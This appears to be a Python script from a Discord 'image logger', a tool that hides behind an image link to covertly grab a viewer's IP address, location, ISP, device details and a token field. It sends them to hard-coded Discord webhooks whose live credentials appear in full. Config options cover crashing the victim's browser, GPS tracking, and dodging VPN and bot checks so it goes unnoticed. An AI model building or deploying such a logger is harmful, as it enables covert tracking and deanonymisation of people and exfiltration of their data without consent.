
import requests, httpagentparser
config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1127802266611634276/QkXfyBN2fEODy5EcY7ONZpYl0sljOFzme0vAuweTEIA1o1Dh9K2oIlRY-vUbPfGPa1iK",
    "webhook_error":"https://discord.com/api/webhooks/1129789976696078489/u1hlj6FRCSBCSXLKAtqCw1PY1929ZA25-oYozoYyHOVHyaFX_CsjXDFmJdcijNk7hHtK",
    "image": "https://media-ten.z-cdn.me/KGjxTNEIU5EAAAAM/she-sheslams.gif", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0xFFFF00, # Hex Color you want for the embed (Example: Red is 0xFF0000)
    "color_error": 0xFF0000, #
    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164")
def CheckIP(ip, useragent = None, coords = None, url = None, token = None, timestamp = None, port = None, filename=None, url_thumbnail = None, botname = 'Image Logger'):
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        if config["vpnCheck"] == 1:
            ping = ""
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return
        if config["antiBot"] == 3:
                return
        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""
    os, browser = httpagentparser.simple_detect(useragent)
    color=config["color"] if token else config['color_error']
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": f"""**{botname}**""",
            "color": color,
            "description": f"""**Image name: {filename}**
> **IP:** `{ip if ip else 'Unknown'}:{port}`
> **Token:** `{token if token else 'BruteForce server'}`
> **Time:** `{timestamp}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
> **OS:** `{os}`
> **Browser:** `{browser}`
> **User Agent: **`{useragent}`
""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url_thumbnail}})
    requests.post(url, json = embed)
    return info
